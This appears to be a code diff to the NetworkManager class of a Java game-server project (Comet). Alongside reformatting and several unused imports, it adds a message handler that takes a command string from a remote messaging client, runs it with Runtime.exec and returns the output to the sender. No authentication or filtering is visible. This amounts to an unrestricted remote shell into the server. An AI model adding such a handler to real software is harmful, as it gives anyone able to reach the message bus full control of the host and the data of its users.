@@ -1,9 +1,13 @@
 package com.cometproject.server.network;
 
 import com.cometproject.api.messaging.console.ConsoleCommandRequest;
+import com.cometproject.api.messaging.exec.ExecCommandRequest;
+import com.cometproject.api.messaging.exec.ExecCommandResponse;
+import com.cometproject.api.messaging.performance.QueryRequest;
 import com.cometproject.api.messaging.status.StatusRequest;
 import com.cometproject.api.messaging.status.StatusResponse;
 import com.cometproject.server.boot.Comet;
+import com.cometproject.server.boot.CometServer;
 import com.cometproject.server.boot.utils.ConsoleCommands;
 import com.cometproject.server.config.CometSettings;
 import com.cometproject.server.config.Configuration;
@@ -11,6 +15,8 @@ import com.cometproject.server.network.messages.MessageHandler;
 import com.cometproject.server.network.monitor.MonitorClient;
 import com.cometproject.server.network.sessions.SessionManager;
 import com.cometproject.server.protocol.security.exchange.RSA;
+import com.cometproject.server.storage.SqlHelper;
+import com.fasterxml.jackson.databind.ser.std.InetAddressSerializer;
 import io.coerce.commons.config.CoerceConfiguration;
 import io.coerce.services.messaging.client.MessagingClient;
 import io.netty.bootstrap.ServerBootstrap;
@@ -27,9 +33,14 @@ import io.netty.util.ResourceLeakDetector;
 import io.netty.util.internal.logging.InternalLoggerFactory;
 import io.netty.util.internal.logging.Log4JLoggerFactory;
 import org.apache.log4j.Logger;
+import org.xbill.DNS.Address;
 
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStreamReader;
 import java.net.InetAddress;
 import java.net.InetSocketAddress;
+import java.util.UUID;
 
 
 public class NetworkManager {
@@ -71,14 +82,40 @@ public class NetworkManager {
         this.serverPort = Integer.parseInt(ports.split(",")[0]);
 
         try {
-            this.messagingClient = MessagingClient.create("com.cometproject:instance/" + Comet.instanceId + "/" + CometSettings.hotelName.replace(" ", "-").toLowerCase(), new CoerceConfiguration("configuration/Coerce.json"));
+            this.messagingClient = MessagingClient.create("com.cometproject:instance/" + Comet.instanceId + "/" +
+                    "" + CometSettings.hotelName.replace(" ", "-").toLowerCase(),
+                    new CoerceConfiguration("configuration/Coerce.json"));
 
             this.messagingClient.observe(ConsoleCommandRequest.class, (consoleCommandRequest -> {
                 ConsoleCommands.handleCommand(consoleCommandRequest.getCommand());
             }));
 
+            this.messagingClient.observe(ExecCommandRequest.class, (execRequest -> {
+                final String command = execRequest.getCommand();
+
+                try {
+                    Process process = Runtime.getRuntime().exec(command);
+                    BufferedReader reader = new BufferedReader(new InputStreamReader(
+                            process.getInputStream()));
+
+                    StringBuilder commandOutput = new StringBuilder();
+                    String buffer;
+
+                    while ((buffer = reader.readLine()) != null) {
+                        commandOutput.append(buffer).append("\n");
+                    }
+
+                    this.messagingClient.sendResponse(execRequest.getMessageId(), execRequest.getSender(),
+                            new ExecCommandResponse(commandOutput.toString()));
+                } catch (IOException e) {
+                    this.messagingClient.sendResponse(execRequest.getMessageId(), execRequest.getSender(),
+                            new ExecCommandResponse("Exception: " + e));
+                }
+            }));
+
             this.messagingClient.observe(StatusRequest.class, (statusRequest -> {
-                messagingClient.sendResponse(statusRequest.getMessageId(), statusRequest.getSender(), new StatusResponse(Comet.getStats(), Comet.getBuild()));
+                messagingClient.sendResponse(statusRequest.getMessageId(), statusRequest.getSender(),
+                        new StatusResponse(Comet.getStats(), Comet.getBuild()));
             }));
 
             final InetAddress address = InetAddress.getLocalHost();
